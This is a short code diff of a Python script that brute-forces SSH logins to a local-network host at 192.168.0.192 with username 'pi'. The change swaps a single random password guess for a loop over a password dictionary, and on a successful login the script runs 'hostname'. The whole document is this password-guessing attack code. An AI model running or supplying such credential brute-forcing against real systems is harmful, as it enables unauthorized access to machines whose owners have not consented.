@@ -10,9 +10,10 @@ client = SSHClient()
 ssh_auth = SSHAuthentication(client, known_hosts_path='C:\\Users\\JuDEV\\.ssh\\known_hosts')
 
 def try_to_login() -> None:  
-    password = GuessPasswordBy().random_password(length=8)
+    # password = GuessPasswordBy().random_password(length=8)
     
-    ssh_auth.login(hostname='192.168.0.192', username='pi', password=password)
+    for password in GuessPasswordBy().dictionary():
+        ssh_auth.login(hostname='192.168.0.192', username='pi', password=password)
     
     stdin, stdout, stderr = client.exec_command('hostname')
     
